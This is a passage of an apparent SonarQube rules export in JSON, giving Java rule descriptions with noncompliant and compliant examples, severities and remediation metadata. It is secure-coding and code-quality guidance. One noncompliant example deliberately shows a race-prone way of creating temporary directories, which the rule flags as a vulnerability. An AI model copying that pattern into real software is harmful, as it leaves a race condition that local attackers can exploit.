Compliant\n\n        Files.setPosixFilePermissions(Paths.get(filePath), perms);\n    }\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control\">OWASP Top 10 2017 Category A5</a> - Broken Access Control </li>\n  <li> <a href=\"https://www.owasp.org/index.php/Test_File_Permission_(OTG-CONFIG-009)\">OWASP File Permission</a> </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/732\">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/266.html\">MITRE, CWE-266</a> - Incorrect Privilege Assignment </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/display/java/FIO01-J.+Create+files+with+appropriate+access+permissions\">CERT, FIO01-J.</a> -\n  Create files with appropriate access permissions </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/display/c/FIO06-C.+Create+files+with+appropriate+access+permissions\">CERT, FIO06-C.</a> - Create\n  files with appropriate access permissions </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat3\">SANS Top 25</a> - Porous Defenses </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "cwe",
                "owasp-a5",
                "sans-top25-porous"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "SECURITY_HOTSPOT"
        },
        {
            "key": "java:S2975",
            "repo": "java",
            "name": "\"clone\" should not be overridden",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Many consider <code>clone</code> and <code>Cloneable</code> broken in Java, largely because the rules for overriding <code>clone</code> are tricky\nand difficult to get right, according to Joshua Bloch:</p>\n<blockquote>\n  Object's clone method is very tricky. It's based on field copies, and it's \"extra-linguistic.\" It creates an object without calling a constructor.\n  There are no guarantees that it preserves the invariants established by the constructors. There have been lots of bugs over the years, both in and\n  outside Sun, stemming from the fact that if you just call super.clone repeatedly up the chain until you have cloned an object, you have a shallow\n  copy of the object. The clone generally shares state with the object being cloned. If that state is mutable, you don't have two independent objects.\n  If you modify one, the other changes as well. And all of a sudden, you get random behavior.\n</blockquote>\n<p>A copy constructor or copy factory should be used instead.</p>\n<p>This rule raises an issue when <code>clone</code> is overridden, whether or not <code>Cloneable</code> is implemented.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyClass {\n  // ...\n\n  public Object clone() { // Noncompliant\n    //...\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class MyClass {\n  // ...\n\n  MyClass (MyClass source) {\n    //...\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.artima.com/intv/bloch13.html\">Copy Constructor versus Cloning</a> </li>\n</ul>\n<h3>See Also</h3>\n<ul>\n  <li> <a href='/coding_rules#rule_key=java%3AS2157'>S2157</a> - \"Cloneables\" should implement \"clone\" </li>\n  <li> <a href='/coding_rules#rule_key=java%3AS1182'>S1182</a> - Classes that override \"clone\" should be \"Cloneable\" and call \"super.clone()\" </li>\n</ul>",
            "mdDesc": "<p>Many consider <code>clone</code> and <code>Cloneable</code> broken in Java, largely because the rules for overriding <code>clone</code> are tricky\nand difficult to get right, according to Joshua Bloch:</p>\n<blockquote>\n  Object's clone method is very tricky. It's based on field copies, and it's \"extra-linguistic.\" It creates an object without calling a constructor.\n  There are no guarantees that it preserves the invariants established by the constructors. There have been lots of bugs over the years, both in and\n  outside Sun, stemming from the fact that if you just call super.clone repeatedly up the chain until you have cloned an object, you have a shallow\n  copy of the object. The clone generally shares state with the object being cloned. If that state is mutable, you don't have two independent objects.\n  If you modify one, the other changes as well. And all of a sudden, you get random behavior.\n</blockquote>\n<p>A copy constructor or copy factory should be used instead.</p>\n<p>This rule raises an issue when <code>clone</code> is overridden, whether or not <code>Cloneable</code> is implemented.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyClass {\n  // ...\n\n  public Object clone() { // Noncompliant\n    //...\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class MyClass {\n  // ...\n\n  MyClass (MyClass source) {\n    //...\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.artima.com/intv/bloch13.html\">Copy Constructor versus Cloning</a> </li>\n</ul>\n<h3>See Also</h3>\n<ul>\n  <li> {rule:java:S2157} - \"Cloneables\" should implement \"clone\" </li>\n  <li> {rule:java:S1182} - Classes that override \"clone\" should be \"Cloneable\" and call \"super.clone()\" </li>\n</ul>",
            "severity": "BLOCKER",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "suspicious"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "30min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "30min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "30min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "30min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2786",
            "repo": "java",
            "name": "Nested \"enum\"s should not be declared static",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>According to <a href=\"http://docs.oracle.com/javase/specs/jls/se7/html/jls-8.html#jls-8.9\">the Java Language Specification-8.9</a>:</p>\n<blockquote>\n  Nested enum types are implicitly\n  <code>static</code>.\n</blockquote>\n<p>So there's no need to declare them <code>static</code> explicitly.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Flower {\n  static enum Color { // Noncompliant; static is redundant here\n    RED, YELLOW, BLUE, ORANGE\n  }\n\n  // ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class Flower {\n  enum Color { // Compliant\n    RED, YELLOW, BLUE, ORANGE\n  }\n\n  // ...\n}\n</pre>",
            "mdDesc": "<p>According to <a href=\"http://docs.oracle.com/javase/specs/jls/se7/html/jls-8.html#jls-8.9\">the Java Language Specification-8.9</a>:</p>\n<blockquote>\n  Nested enum types are implicitly\n  <code>static</code>.\n</blockquote>\n<p>So there's no need to declare them <code>static</code> explicitly.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Flower {\n  static enum Color { // Noncompliant; static is redundant here\n    RED, YELLOW, BLUE, ORANGE\n  }\n\n  // ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class Flower {\n  enum Color { // Compliant\n    RED, YELLOW, BLUE, ORANGE\n  }\n\n  // ...\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "clumsy"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2976",
            "repo": "java",
            "name": "\"File.createTempFile\" should not be used to create a directory",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Using <code>File.createTempFile</code> as the first step in creating a temporary directory causes a race condition and is inherently unreliable and\ninsecure. Instead, <code>Files.createTempDirectory</code> (Java 7+) or a library function such as Guava's similarly-named\n<code>Files.createTempDir</code> should be used.</p>\n<p>This rule raises an issue when the following steps are taken in immediate sequence:</p>\n<ul>\n  <li> call to <code>File.createTempFile</code> </li>\n  <li> delete resulting file </li>\n  <li> call <code>mkdir</code> on the File object </li>\n</ul>\n<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>7</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nFile tempDir;\ntempDir = File.createTempFile(\"\", \".\");\ntempDir.delete();\ntempDir.mkdir();  // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nPath tempPath = Files.createTempDirectory(\"\");\nFile tempDir = tempPath.toFile();\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A9-Using_Components_with_Known_Vulnerabilities\">OWASP Top 10 2017 Category A9</a> - Using\n  Components with Known Vulnerabilities </li>\n</ul>",
            "mdDesc": "<p>Using <code>File.createTempFile</code> as the first step in creating a temporary directory causes a race condition and is inherently unreliable and\ninsecure. Instead, <code>Files.createTempDirectory</code> (Java 7+) or a library function such as Guava's similarly-named\n<code>Files.createTempDir</code> should be used.</p>\n<p>This rule raises an issue when the following steps are taken in immediate sequence:</p>\n<ul>\n  <li> call to <code>File.createTempFile</code> </li>\n  <li> delete resulting file </li>\n  <li> call <code>mkdir</code> on the File object </li>\n</ul>\n<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>7</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nFile tempDir;\ntempDir = File.createTempFile(\"\", \".\");\ntempDir.delete();\ntempDir.mkdir();  // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nPath tempPath = Files.createTempDirectory(\"\");\nFile tempDir = tempPath.toFile();\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A9-Using_Components_with_Known_Vulnerabilities\">OWASP Top 10 2017 Category A9</a> - Using\n  Components with Known Vulnerabilities </li>\n</ul>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "owasp-a9"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "VULNERABILITY"
        },
        {
            "key": "java:S5810",
            "repo": "java",
            "name": "JUnit5 test classes and methods should not be silently ignored",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>JUnit5 is more tolerant regarding the visibilities of Test classes and methods than JUnit4, which required everything to be public. JUnit5 supports\ndefault package, public and protected visibility, even if it is recommended to use the default package visibility, which improves the readability of\ncode.</p>\n<p>But JUnit5 ignores without any warning:</p>\n<ul>\n  <li> private classes and private methods </li>\n  <li> static methods </li>\n  <li> methods returning a value without being a TestFactory </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\nimport org.junit.jupiter.api.Test;\n\nclass MyClassTest {\n  @Test\n  private void test1() { // Noncompliant - ignored by JUnit5\n    // ...\n  }\n  @Test\n  static void test2() { // Noncompliant - ignored by JUnit5\n    // ...\n  }\n  @Test\n  boolean test3() { // Noncompliant - ignored by JUnit5\n    // ...\n  }\n  @Nested\n  private class MyNestedClass { // Noncompliant - ignored by JUnit5\n    @Test\n    void test() {\n      // ...\n    }\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nimport org.junit.jupiter.api.Test;\n\nclass MyClassTest {\n  @Test\n  void test1() {\n    // ...\n  }\n  @Test\n  void test2() {\n    // ...\n  }\n  @Test\n  void test3() {\n    // ...\n  }\n  @Nested\n  class MyNestedClass {\n    @Test\n    void test() {\n      // ...\n    }\n  }\n}\n</pre>",
            "mdDesc": "<p>JUnit5 is more tolerant regarding the visibilities of Test classes and methods than JUnit4, which required everything to be public. JUnit5 supports\ndefault package, public and protected visibility, even if it is recommended to use the default package visibility, which improves the readability of\ncode.</p>\n<p>But JUnit5 ignores without any warning:</p>\n<ul>\n  <li> private classes and private methods </li>\n  <li> static methods </li>\n  <li> methods returning a value without being a TestFactory </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\nimport org.junit.jupiter.api.Test;\n\nclass MyClassTest {\n  @Test\n  private void test1() { // Noncompliant - ignored by JUnit5\n    // ...\n  }\n  @Test\n  static void test2() { // Noncompliant - ignored by JUnit5\n    // ...\n  }\n  @Test\n  boolean test3() { // Noncompliant - ignored by JUnit5\n    // ...\n  }\n  @Nested\n  private class MyNestedClass { // Noncompliant - ignored by JUnit5\n    @Test\n    void test() {\n      // ...\n    }\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nimport org.junit.jupiter.api.Test;\n\nclass MyClassTest {\n  @Test\n  void test1() {\n    // ...\n  }\n  @Test\n  void test2() {\n    // ...\n  }\n  @Test\n  void test3() {\n    // ...\n  }\n  @Nested\n  class MyNestedClass {\n    @Test\n    void test() {\n      // ...\n    }\n  }\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "junit",
                "tests"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S1214",
            "repo": "java",
            "name": "Constants should not be defined in interfaces",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>According to Joshua Bloch, author of \"Effective Java\":</p>\n<blockquote>\n  <p>The constant interface pattern is a poor use of interfaces. </p>\n  <p>That a class uses some constants internally is an implementation detail.</p>\n  <p>Implementing a constant interface causes this implementation detail to leak into the class's exported API. It is of no consequence to the users\n  of a class that the class implements a constant interface. In fact, it may even confuse them. Worse, it represents a commitment: if in a future\n  release the class is modified so that it no longer needs to use the constants, it still must implement the interface to ensure binary compatibility.\n  If a nonfinal class implements a constant interface,</p>\n  <p>all of its subclasses will have their namespaces polluted by the constants in the interface.</p>\n</blockquote>\n<p>This rule raises an issue when an interface consists solely of fields, without any other members.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\ninterface Status {                      // Noncompliant\n   int OPEN = 1;\n   int CLOSED = 2;\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic enum Status {                    // Compliant\n  OPEN,\n  CLOSED;\n}\n</pre>\n<p>or</p>\n<pre>\npublic final class Status {             // Compliant\n   public static final int OPEN = 1;\n   public static final int CLOSED = 2;\n}\n</pre>",
            "mdDesc": "<p>According to Joshua Bloch, author of \"Effective Java\":</p>\n<blockquote>\n  <p>The constant interface pattern is a poor use of interfaces. </p>\n  <p>That a class uses some constants internally is an implementation detail.</p>\n  <p>Implementing a constant interface causes this implementation detail to leak into the class's exported API. It is of no consequence to the users\n  of a class that the class implements a constant interface. In fact, it may even confuse them. Worse, it represents a commitment: if in a future\n  release the class is modified so that it no longer needs to use the constants, it still must implement the interface to ensure binary compatibility.\n  If a nonfinal class implements a constant interface,</p>\n  <p>all of its subclasses will have their namespaces polluted by the constants in the interface.</p>\n</blockquote>\n<p>This rule raises an issue when an interface consists solely of fields, without any other members.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\ninterface Status {                      // Noncompliant\n   int OPEN = 1;\n   int CLOSED = 2;\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic enum Status {                    // Compliant\n  OPEN,\n  CLOSED;\n}\n</pre>\n<p>or</p>\n<pre>\npublic final class Status {             // Compliant\n   public static final int OPEN = 1;\n   public static final int CLOSED = 2;\n}\n</pre>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "bad-practice"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1698",
            "repo": "java",
            "name": "\"==\" and \"!=\" should not be used when \"equals\" is overridden",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>It is equivalent to use the equality <code>==</code> operator and the <code>equals</code> method to compare two objects if the <code>equals</code>\nmethod inherited from <code>Object</code> has not been overridden. In this case both checks compare the object references.</p>\n<p>But as soon as <code>equals</code> is overridden, two objects not having the same reference but having the same value can be equal. This rule spots\nsuspicious uses of <code>==</code> and <code>!=</code> operators on objects whose <code>equals</code> methods are overridden.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nString firstName = getFirstName(); // String overrides equals\nString lastName = getLastName();\n\nif (firstName == lastName) { ... }; // Non-compliant; false even if the strings have the same value\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nString firstName = getFirstName();\nString lastName = getLastName();\n\nif (firstName != null &amp;&amp; firstName.equals(lastName)) { ... };\n</pre>\n<h2>Exceptions</h2>\n<p>Comparing two instances of the <code>Class</code> object will not raise an issue:</p>\n<pre>\nClass c;\nif(c == Integer.class) { // No issue raised\n}\n</pre>\n<p>Comparing <code>Enum</code> will not raise an issue:</p>\n<pre>\npublic enum Fruit {\n   APPLE, BANANA, GRAPE\n}\npublic boolean isFruitGrape(Fruit candidateFruit) {\n  return candidateFruit == Fruit.GRAPE; // it's recommended to activate S4551 to enforce comparison of Enums using ==\n}\n</pre>\n<p>Comparing with <code>final</code> reference will not raise an issue:</p>\n<pre>\nprivate static final Type DEFAULT = new Type();\n\nvoid foo(Type other) {\n  if (other == DEFAULT) { // Compliant\n  //...\n  }\n}\n</pre>\n<p>Comparing with <code>this</code> will not raise an issue:</p>\n<pre>\n  public boolean equals(Object other) {\n    if (this == other) {  // Compliant\n      return false;\n    }\n }\n</pre>\n<p>Comparing with <code>java.lang.String</code> and boxed types <code>java.lang.Integer</code>, ... will not raise an issue. </p>\n<h2>See</h2>\n<ul>\n  <li> <a href='/coding_rules#rule_key=java%3AS4973'>S4973</a> - Strings and Boxed types should be compared using \"equals()\" </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/595.html\">MITRE, CWE-595</a> - Comparison of Object References Instead of Object Contents </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/597.html\">MITRE, CWE-597</a> - Use of Wrong Operator in String Comparison </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/UjdGBQ\">CERT, EXP03-J.</a> - Do not use the equality operators when comparing values of boxed\n  primitives </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/yDdGBQ\">CERT, EXP50-J.</a> - Do not confuse abstract object equality with reference equality\n  </li>\n</ul>",
            "mdDesc": "<p>It is equivalent to use the equality <code>==</code> operator and the <code>equals</code> method to compare two objects if the <code>equals</code>\nmethod inherited from <code>Object</code> has not been overridden. In this case both checks compare the object references.</p>\n<p>But as soon as <code>equals</code> is overridden, two objects not having the same reference but having the same value can be equal. This rule spots\nsuspicious uses of <code>==</code> and <code>!=</code> operators on objects whose <code>equals</code> methods are overridden.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nString firstName = getFirstName(); // String overrides equals\nString lastName = getLastName();\n\nif (firstName == lastName) { ... }; // Non-compliant; false even if the strings have the same value\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nString firstName = getFirstName();\nString lastName = getLastName();\n\nif (firstName != null &amp;&amp; firstName.equals(lastName)) { ... };\n</pre>\n<h2>Exceptions</h2>\n<p>Comparing two instances of the <code>Class</code> object will not raise an issue:</p>\n<pre>\nClass c;\nif(c == Integer.class) { // No issue raised\n}\n</pre>\n<p>Comparing <code>Enum</code> will not raise an issue:</p>\n<pre>\npublic enum Fruit {\n   APPLE, BANANA, GRAPE\n}\npublic boolean isFruitGrape(Fruit candidateFruit) {\n  return candidateFruit == Fruit.GRAPE; // it's recommended to activate S4551 to enforce comparison of Enums using ==\n}\n</pre>\n<p>Comparing with <code>final</code> reference will not raise an issue:</p>\n<pre>\nprivate static final Type DEFAULT = new Type();\n\nvoid foo(Type other) {\n  if (other == DEFAULT) { // Compliant\n  //...\n  }\n}\n</pre>\n<p>Comparing with <code>this</code> will not raise an issue:</p>\n<pre>\n  public boolean equals(Object other) {\n    if (this == other) {  // Compliant\n      return false;\n    }\n }\n</pre>\n<p>Comparing with <code>java.lang.String</code> and boxed types <code>java.lang.Integer</code>, ... will not raise an issue. </p>\n<h2>See</h2>\n<ul>\n  <li> {rule:java:S4973} - Strings and Boxed types should be compared using \"equals()\" </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/595.html\">MITRE, CWE-595</a> - Comparison of Object References Instead of Object Contents </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/597.html\">MITRE, CWE-597</a> - Use of Wrong Operator in String Comparison </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/UjdGBQ\">CERT, EXP03-J.</a> - Do not use the equality operators when comparing values of boxed\n  primitives </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/yDdGBQ\">CERT, EXP50-J.</a> - Do not confuse abstract object equality with reference equality\n  </li>\n</ul>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "cwe",
                "suspicious"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1213",
            "repo": "java",
            "name": "The members of an interface or class declaration should appear in a pre-defined order",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>According to the Java Code Conventions as defined by Oracle, the members of a class or interface declaration should appear in the following order\nin the source files:</p>\n<ul>\n  <li> Class variables </li>\n  <li> Instance variables </li>\n  <li> Constructors </li>\n  <li> Methods </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Foo{\n   private int field = 0;\n   public boolean isTrue() {...}\n   public Foo() {...}                         // Noncompliant, constructor defined after methods\n   public static final int OPEN = 4;  //Noncompliant, variable defined after constructors and methods\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class Foo{\n   public static final int OPEN = 4;\n   private int field = 0;\n   public Foo() {...}\n   public boolean isTrue() {...}\n}\n</pre>",
            "mdDesc": "<p>According to the Java Code Conventions as defined by Oracle, the members of a class or interface declaration should appear in the following order\nin the source files:</p>\n<ul>\n  <li> Class variables </li>\n  <li> Instance variables </li>\n  <li> Constructors </li>\n  <li> Methods </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Foo{\n   private int field = 0;\n   public boolean isTrue() {...}\n   public Foo() {...}                         // Noncompliant, constructor defined after methods\n   public static final int OPEN = 4;  //Noncompliant, variable defined after constructors and methods\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class Foo{\n   public static final int OPEN = 4;\n   private int field = 0;\n   public Foo() {...}\n   public boolean isTrue() {...}\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "convention"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1697",
            "repo": "java",
            "name": "Short-circuit logic should be used to prevent null pointer dereferences in conditionals",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>When either the equality operator in a null test or the logical operator that follows it is reversed, the code has the appearance of safely\nnull-testing the object before dereferencing it. Unfortunately the effect is just the opposite - the object is null-tested and then dereferenced\n<em>only</em> if it is null, leading to a guaranteed null pointer dereference.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (str == null &amp;&amp; str.length() == 0) {\n  System.out.println(\"String is empty\");\n}\n\nif (str != null || str.length() &gt; 0) {\n  System.out.println(\"String is not empty\");\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nif (str == null || str.length() == 0) {\n  System.out.println(\"String is empty\");\n}\n\nif (str != null &amp;&amp; str.length() &gt; 0) {\n  System.out.println(\"String is not empty\");\n}\n</pre>\n<h2>Deprecated</h2>\n<p>This rule is deprecated; use <a href='/coding_rules#rule_key=java%3AS2259'>S2259</a> instead.</p>",
            "mdDesc": "<p>When either the equality operator in a null test or the logical operator that follows it is reversed, the code has the appearance of safely\nnull-testing the object before dereferencing it. Unfortunately the effect is just the opposite - the object is null-tested and then dereferenced\n<em>only</em> if it is null, leading to a guaranteed null pointer dereference.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (str == null &amp;&amp; str.length() == 0) {\n  System.out.println(\"String is empty\");\n}\n\nif (str != null || str.length() &gt; 0) {\n  System.out.println(\"String is not empty\");\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nif (str == null || str.length() == 0) {\n  System.out.println(\"String is empty\");\n}\n\nif (str != null &amp;&amp; str.length() &gt; 0) {\n  System.out.println(\"String is not empty\");\n}\n</pre>\n<h2>Deprecated</h2>\n<p>This rule is deprecated; use {rule:java:S2259} instead.</p>",
            "severity": "MAJOR",
            "status": "DEPRECATED",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S4602",
            "repo": "java",
            "name": "\"@SpringBootApplication\" and \"@ComponentScan\" should not be used in the default package",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p><code>@ComponentScan</code> is used to determine which Spring Beans are available in the application context. The packages to scan can be\nconfigured thanks to the <code>basePackageClasses</code> or <code>basePackages</code> (or its alias <code>value</code>) parameters. If neither\nparameter is configured, <code>@ComponentScan</code> will consider only the package of the class annotated with it. When <code>@ComponentScan</code>\nis used on a class belonging to the default package, the entire classpath will be scanned.</p>\n<p>This will slow-down the start-up of the application and it is likely the application will fail to start with an\n<code>BeanDefinitionStoreException</code> because you ended up scanning the Spring Framework package itself.</p>\n<p>This rule raises an issue when:</p>\n<p>- <code>@ComponentScan</code>, <code>@SpringBootApplication</code> and <code>@ServletComponentScan</code> are used on a class belonging to the\ndefault package</p>\n<p>- <code>@ComponentScan</code> is explicitly configured with the default package</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nimport org.springframework.boot.SpringApplication;\n\n@SpringBootApplication // Noncompliant; RootBootApp is declared in the default package\npublic class RootBootApp {\n...\n}\n</pre>\n<pre>\n@ComponentScan(\"\")\npublic class Application {\n...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npackage hello;\n\nimport org.springframework.boot.SpringApplication;\n\n@SpringBootApplication // Compliant; RootBootApp belongs to the \"hello\" package\npublic class RootBootApp {\n...\n}\n</pre>",
